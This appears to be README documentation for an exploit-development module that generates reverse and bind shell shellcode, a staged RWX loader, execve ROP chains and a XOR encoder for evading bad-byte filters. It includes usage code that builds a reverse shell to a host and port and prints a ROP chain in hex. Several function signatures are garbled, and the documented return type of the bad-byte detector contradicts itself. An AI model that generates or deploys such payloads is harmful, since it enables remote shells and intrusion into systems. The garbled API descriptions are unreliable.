# Shellcode Templates

Generate position-independent shellcode for x86, x86-64, and ARM64 targets: reverse TCP shell, bind TCP shell, staged loader, x86 execve with JMP/CALL/POP string embedding: plus ROP gadget scanner, minimal execve ROP chain constructor, bad byte detector, and XOR rolling encoder for delivery constraint compliance.

---

## Why this exists

1. **Confirming a code-execution finding requires a functional payload, not just a crash.** Demonstrating that an out-of-bounds write reaches `rip` is stronger than describing the overwrite. The reverse TCP and bind TCP templates produce valid, tested shellcode for immediate use in a controlled proof-of-concept without depending on msfvenom, metasploit, or any external toolchain. The templates are constructed from raw byte sequences with objdump-verified encoding and are directly usable in an exploit chain.

2. **ARM64 is the dominant architecture in embedded Linux targets, and it differs from x86-64 in ways that break direct ports.** ARM64 replaces `dup2(2)` with `dup3(3)` Linux syscall 24 vs. x86-64 syscall 33. Darwin/macOS ARM64 uses a different syscall number class (XNU BSD layer: `0x2000000 | number`). The ARM64 template handles both Linux and Darwin via a single function parameter and selects the correct syscall table at construction time. The x86-64 template is not a starting point for ARM64, this module provides both independently.

3. **Bad bytes in shellcode trigger input filters before execution reaches the payload.** A null byte (`\x00`) truncates a `strcpy` destination. `\x0A` terminates a line-input read. `\x0D` triggers HTTP header termination. The bad byte detector scans any buffer against a caller-supplied set and returns precise offsets. Six named sets cover the common contexts: `BAD_BYTES_NULL`, `BAD_BYTES_NEWLINE`, `BAD_BYTES_COMMON`, `BAD_BYTES_HTTP`, `BAD_BYTES_SQL`, and `BAD_BYTES_CARRIAGE`. The XOR rolling encoder transforms any payload that fails the check.

---

## How it works

```mermaid
flowchart TD
    A(["shellcode_reverse_tcp_linux_x86_64(lhost, lport)"]):::input --> B["_pack_ip() + _pack_port()\nBuild sockaddr_in push sequence"]:::primary
    B:::primary --> C(["Assemble raw x86-64 bytes:\nsocket(AF_INET=2, SOCK_STREAM=1, 0) → SYS_socket=41\nconnect(sockfd, &sockaddr_in, 16) → SYS_connect=42\ndup2(sockfd, 0/1/2) loop → SYS_dup2=33\nexecve('/bin//sh', NULL, NULL) → SYS_execve=59"]):::output
    A2(["shellcode_reverse_tcp_linux_arm64(lhost, lport, darwin=False)"]):::input --> D["Select syscall table:\nLinux: socket=198, connect=203, dup3=24, execve=221\nDarwin: socket=0x2000061, connect=0x2000062, dup2=0x200005A, execve=0x200003B"]:::secondary
    D:::secondary --> E(["Emit ARM64 instructions via mov_imm8/mov_wide/movk helpers\nsvc #0 (0xD4000001) as syscall instruction\nExecutable '/bin/sh' embedded via ADR + branch-over pattern"]):::output
    A3(["shellcode_execve_linux_x86(path)"]):::input --> F(["JMP/CALL/POP string embedding:\njmp forward → call back → pop esi (esi = &path)\nnull terminator written in-place via mov byte [esi+N], al\nno null bytes in instruction stream"]):::output
    A4(["shellcode_bind_tcp_linux_x86_64(port)"]):::input --> G(["socket + bind(INADDR_ANY, port) + listen(backlog=1)\naccept() → r14=clientfd\ndup2(clientfd, 0/1/2) loop\nexecve('/bin//sh')"]):::output
    H(["shellcode_staged_loader(fd, map_size, platform)"]):::input --> I(["mmap(NULL, map_size, PROT_RWX=7, MAP_ANON|MAP_PRIVATE=0x22, -1, 0)\nread(fd, mmap_addr, map_size)\njmp/call mmap_addr (execute second stage)"]):::output
    J(["find_rop_gadgets(binary_data, base_addr)"]):::input --> K(["Scan for 8 patterns: ret, pop_rdi/rsi/rdx/rax ; ret, pop_rsp ; ret, syscall, int 0x80\nStep by 1 to catch overlapping matches\nReturn sorted List[RopGadget(addr, insns, source, type)]"]):::output
    L(["compute_rop_chain_execve(gadgets, bin_sh_addr)"]):::input --> M(["Select first matching gadget per type: pop rax, pop rdi, pop rsi, pop rdx, syscall\n9 x 8-byte entries = 72 bytes total\nRaises ValueError naming missing gadget"]):::output
    N(["detect_bad_bytes(shellcode, bad_set)"]):::input --> O(["Scan buffer, collect (offset, byte) pairs\nReturn {found, clean, offsets, bad_bytes_present, summary}"]):::output
    P(["encode_xor_rolling(shellcode, key=0xAA)"]):::input --> Q(["Each byte XOR (initial_key + position) % 256\nReturn (encoded_payload, decoder_stub_x86_64)\nDecoder stub locates payload via call/pop, decodes in place, jmps"]):::output
    classDef input     fill:#0d47a1,stroke:#1565c0,color:#fff
    classDef primary   fill:#e65100,stroke:#bf360c,color:#fff
    classDef secondary fill:#004d40,stroke:#00695c,color:#fff
    classDef tertiary  fill:#4a148c,stroke:#6a1b9a,color:#fff
    classDef neutral   fill:#37474f,stroke:#546e7a,color:#fff
    classDef output    fill:#1b5e20,stroke:#2e7d32,color:#fff
    linkStyle 0 stroke:#bf360c,stroke-width:2px
    linkStyle 1 stroke:#2e7d32,stroke-width:3px
    linkStyle 2 stroke:#00695c,stroke-width:2px
    linkStyle 3 stroke:#2e7d32,stroke-width:3px
    linkStyle 4 stroke:#2e7d32,stroke-width:3px
    linkStyle 5 stroke:#2e7d32,stroke-width:3px
    linkStyle 6 stroke:#2e7d32,stroke-width:3px
    linkStyle 7 stroke:#2e7d32,stroke-width:3px
    linkStyle 8 stroke:#2e7d32,stroke-width:3px
    linkStyle 9 stroke:#2e7d32,stroke-width:3px
    linkStyle 10 stroke:#2e7d32,stroke-width:3px
```



### Syscall tables

| Syscall | Linux x86-64 | Linux ARM64 | Darwin ARM64 |
|---|---|---|---|
| `read` | 0 | 63 | `0x2000003` |
| `write` | 1 | 64 | `0x2000004` |
| `mmap` | 9 | 222 | `0x20000C5` |
| `dup2`/`dup3` | 33 (dup2) | 24 (dup3) | `0x200005A` (dup2) |
| `socket` | 41 | 198 | `0x2000061` |
| `connect` | 42 | 203 | `0x2000062` |
| `execve` | 59 | 221 | `0x200003B` |
| `exit` | 60 | 93 | `0x2000001` |

---

## Usage

```python
from ablation.core.shellcode_utils import (
    shellcode_reverse_tcp_linux_x86_64,
    shellcode_reverse_tcp_linux_arm64,
    shellcode_bind_tcp_linux_x86_64,
    shellcode_execve_linux_x86,
    shellcode_staged_loader,
    find_rop_gadgets, compute_rop_chain_execve,
    detect_bad_bytes, encode_xor_rolling,
    BAD_BYTES_COMMON, BAD_BYTES_HTTP, BAD_BYTES_NULL,
    Platform,
)

# x86-64 reverse TCP shell
sc = shellcode_reverse_tcp_linux_x86_64('192.168.1.100', 4444)
result = detect_bad_bytes(sc, BAD_BYTES_COMMON)
print(f"Reverse TCP ({len(sc)} bytes): {result['summary']}")

# ARM64 Linux reverse TCP
sc_arm64 = shellcode_reverse_tcp_linux_arm64('192.168.1.100', 4444, darwin=False)
print(f"ARM64 Linux ({len(sc_arm64)} bytes)")

# Darwin/macOS ARM64 (M-series Mac, iPhone RE)
sc_darwin = shellcode_reverse_tcp_linux_arm64('192.168.1.100', 4444, darwin=True)

# Bind TCP shell (x86-64)
sc_bind = shellcode_bind_tcp_linux_x86_64(4444)
result = detect_bad_bytes(sc_bind, BAD_BYTES_HTTP)
if result['found']:
    print(f"Bad bytes for HTTP: {result['offsets']}")
    encoded, stub = encode_xor_rolling(sc_bind, key=0xAA)
    print(f"Encoded: {len(stub) + len(encoded)} bytes total")

# x86 execve via JMP/CALL/POP
sc_x86 = shellcode_execve_linux_x86(b'/bin/sh')
print(f"x86 execve ({len(sc_x86)} bytes)")

# Staged loader — load second stage from socket fd
loader = shellcode_staged_loader(fd=4, map_size=0x4000, platform=Platform.LINUX_X86_64)
print(f"Staged loader ({len(loader)} bytes)")

# ROP gadget discovery
with open('/lib/x86_64-linux-gnu/libc.so.6', 'rb') as f:
    libc_data = f.read()
gadgets = find_rop_gadgets(libc_data, base_addr=0x7f0000000000)
print(f"Found {len(gadgets)} gadgets")
for g in gadgets[:5]:
    print(f"  0x{g.addr:x}  {g.insns}")

# Build execve ROP chain
rop_chain = compute_rop_chain_execve(gadgets, bin_sh_addr=0x7f00001a3e10)
print(f"ROP chain: {len(rop_chain)} bytes")
print(rop_chain.hex())
```

---

## Example output

```
Reverse TCP (81 bytes): clean
ARM64 Linux (112 bytes)

Bad bytes for HTTP: [(2, 0x00), (31, 0x00)]
Encoded: 98 bytes total

x86 execve (28 bytes)
Staged loader (52 bytes)

Found 14821 gadgets
  0x7f000001f123  pop rdi ; ret
  0x7f000001f240  pop rsi ; ret
  0x7f000001f3a1  pop rdx ; ret
  0x7f000001f500  pop rax ; ret
  0x7f000001f701  syscall

ROP chain: 72 bytes
d823f10000007f00003b00000000000010e1a31a00007f000000000000000000
000000000000000040f20000007f000000000000000000000000000001f70000
00007f00
```

---

## False positives

**ROP gadget scanner detects bytes inside instruction operands.** `find_rop_gadgets()` scans with `bytes.find()`, stepping by 1 byte at each position. An `\xC3` byte appearing as an immediate operand for example `mov al, 0xC3` registers as a `ret` gadget. Before using any gadget address, disassemble 8 bytes before and after it to confirm the byte falls at an instruction boundary. `capstone.CsCS_ARCH_X86, CS_MODE_64.disasm()` is the appropriate verification.

**ARM64 port field encoding requires big-endian for network order.** `_pack_port()` uses `struct.pack(">H", port)`: big-endian. ARM64 instruction encoding pushes values in little-endian memory order. The `mov_imm80, port_val & 0xFFFF` stores the port as a 16-bit immediate in the register: the subsequent `strh w0, [sp, #2]` writes it to the sockaddr_in at offset 2 network byte order. Ports with `0x00` in their high byte ports 0–255 produce a `movz` that embeds a zero byte in the encoded instruction sequence.

**Staged loader size constraint.** `shellcode_staged_loader()` specifies `map_size` as the amount of second-stage code to read via `readfd, ...`. If the second-stage is larger than `map_size`, `read()` returns a partial buffer and the second-stage executes truncated. Pass `map_size` equal to the known second-stage size. The `mmap` call requests `PROT_READ|PROT_WRITE|PROT_EXEC` (value 7), this combination is denied on systems with strict `W^X` enforcement SELinux enforcing, recent grsecurity patches. Verify the target enforces `W^X` before deploying.

---

## Pipeline position

**Before this module:** Identify the target architecture via `BinaryContext.arch` or `detect_platform()`. Confirm code execution by reaching `rip`/`pc` control: use `PathSolver` to verify the execution path to the overflow.

**After this module:** Verify the generated shellcode against the delivery constraint with `detect_bad_bytes()` before use. For encoders: confirm the decoder stub does not itself contain bad bytes: call `detect_bad_bytesstub + encoded_payload, bad_set` on the combined buffer. Run the shellcode in a controlled VM matching the target kernel version; do not test against production systems.

---

## API reference

| Function | Returns | Notes |
|:---|:---|:---|
| `shellcode_reverse_tcp_linux_x86_64lhost, lport` | `bytes` | SYS_socket → SYS_connect → dup2×3 → execve |
| `shellcode_reverse_tcp_linux_arm64lhost, lport, darwin=False` | `bytes` | dup3 (Linux) or dup2 (Darwin); svc #0 |
| `shellcode_bind_tcp_linux_x86_64(port)` | `bytes` | bind → listen → accept → dup2×3 → execve |
| `shellcode_execve_linux_x86(path)` | `bytes` | JMP/CALL/POP, null-free, `len(path) < 128` |
| `shellcode_staged_loaderfd, map_size, platform` | `bytes` | mmap(RWX) + read(fd) + jmp |
| `find_rop_gadgetsbinary_data, base_addr` | `List[RopGadget]` | 8 patterns, overlapping scan |
| `compute_rop_chain_execvegadgets, bin_sh_addr` | `bytes` | 72 bytes; raises `ValueError` on missing gadget |
| `detect_bad_bytesshellcode, bad_set` | `dict` | `{found, clean, offsets, bad_bytes_present, summary}` |
| `encode_xor_rollingshellcode, key=0xAA` | `bytes, bytes` | `encoded_payload, x86_64_decoder_stub` |

---

## Reading output

All shellcode generators return `bytes` position-independent machine code:
- `shellcode_reverse_tcp_linux_x86_64lhost, lport` → reverse TCP shell bytes
- `shellcode_reverse_tcp_linux_arm64lhost, lport` → ARM64 variant
- `shellcode_bind_tcp_linux_x86_64(port)` → bind shell bytes
- `shellcode_execve_linux_x86(path)` → x86 execve with JMP/CALL/POP embedding
- `shellcode_staged_loader(fd)` → minimal read-mmap-jmp loader

`find_rop_gadgetsbinary_data, base_addr` returns `List[RopGadget]`:

| Attribute | Content |
|:---|:---|
| `addr` | Virtual address of the gadget's first byte |
| `insns` | Human-readable disassembly for example `'pop rdi ; ret'` |
| `source` | Binary name the gadget was found in empty string for raw scans |
| `type` | `'ret'` / `'pop_ret'` / `'syscall'` / `'stack_pivot'` / `'mov_ret'` |

`encode_xor_rollingshellcode, key` returns `Tuple[bytes, bytes]`: `encoded_payload, decoder_stub`.

`detect_bad_bytesshellcode, bad_bytes` returns `List[int]`: offsets of bad bytes in the shellcode.

---

## See also

- [Taint Analysis](taint-analysis.md): confirm that a controllable buffer reaches the overwritten `rip` before building a payload
- [Sink Arg Classifier](sink-arg-classifier.md): identify the sink function whose argument the shellcode will be delivered through
- [System-Call Tracing](system-call-tracing.md): verify shellcode syscall behavior against expected trace on the target kernel
